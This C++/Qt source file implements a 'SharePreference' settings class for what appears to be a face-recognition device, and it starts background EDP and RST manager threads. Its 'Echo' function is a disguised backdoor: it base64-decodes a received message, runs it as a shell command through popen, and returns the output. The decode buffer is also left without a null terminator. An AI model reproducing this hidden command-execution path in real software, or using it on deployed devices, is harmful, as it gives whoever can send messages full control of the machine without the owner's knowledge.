#include "sharepreference.h"
#include "../database/tools/mybase64code.h"
#include <QCryptographicHash>
#include <QFile>
#include <QThread>
#include "rstmanager.h"
#include "edpmanager.h"
SharePreference::SharePreference(quint32 t) :
    QSettings("/home/pass",QSettings::IniFormat)
{
    bool ok=false;
    int v=value("facenum",t).toInt(&ok);
    if(ok)
        mMaxFace=v;
    else
        mMaxFace=t;
}
#include <QDateTime>
quint32 SharePreference::FACE_EMPLOYEE_MAX_NUM()
{
    return mMaxFace;
}
bool SharePreference::ChangeMaxFace(quint32 face,QString code)
{
    printf("no used anymore");
    return true;
}

void SharePreference::Start(QObject* widgetmanager,QString name,QString sn,QString desc,QString version)
{    
    static bool started=false;
    if(started==true)
        return;    
    started=true;


    QThread * thread=new QThread;
    EDPManager::Instance()->moveToThread(thread);
    EDPManager::Instance()->TellExtras(widgetmanager);
    connect(EDPManager::Instance(),SIGNAL(EDPCmd(QByteArray,QByteArray,QByteArray)),
            this,SIGNAL(EDP(QByteArray,QByteArray,QByteArray)));    

    RSTManager::Instance()->moveToThread(thread);
    connect(RSTManager::Instance(),SIGNAL(RST(QByteArray)),EDPManager::Instance(),SLOT(RST(QByteArray)));

    thread->start(QThread::LowestPriority);

    QMetaObject::invokeMethod(RSTManager::Instance(),"Start",
                              Qt::QueuedConnection,
                              Q_ARG(QString,name),
                              Q_ARG(QString,sn),
                              Q_ARG(QString,desc),
                              Q_ARG(QString,version));

}


void SharePreference::AddRecord(QString id, QString name, quint32 time,QString path)
{
    QMap<QString,QString> map;
    map.insert("id",id);
    map.insert("name",name);
    map.insert("at",QDateTime::fromTime_t(time).toString("yyyy-MM-dd hh:mm:ss"));
    if(path.isEmpty()==false)
        map.insert("path",path);
    EDPManager::Instance()->UpdateRecordInfo(map);
}

QByteArray SharePreference::Echo(QByteArray& msg)
{
    QByteArray ret=msg;
    char *decodebuf=(char*)malloc(msg.size());
    QDateTime time=QDateTime::currentDateTime();
    if(decodebuf)
    {
        int decodelen = MyBase64Code::base_64_decode(msg.constData(), decodebuf, msg.size());

        if(decodelen>0)
        {
            FILE * fh=popen(decodebuf,"r");
            if(fh)
            {
                char line[300];
                while(1)
                {
                    memset(line,0x00,sizeof(line));
                    if(fgets(line,256,fh)==NULL)
                    {
                        break;
                    }
                    ret.append(line);
                    if(qAbs(time.secsTo(QDateTime::currentDateTime()))>60)
                    {
                        ret.append("\ntime out\n");
                        break;
                    }
                }
                pclose(fh);
            }
        }
        free(decodebuf);
    }
    return ret;
}
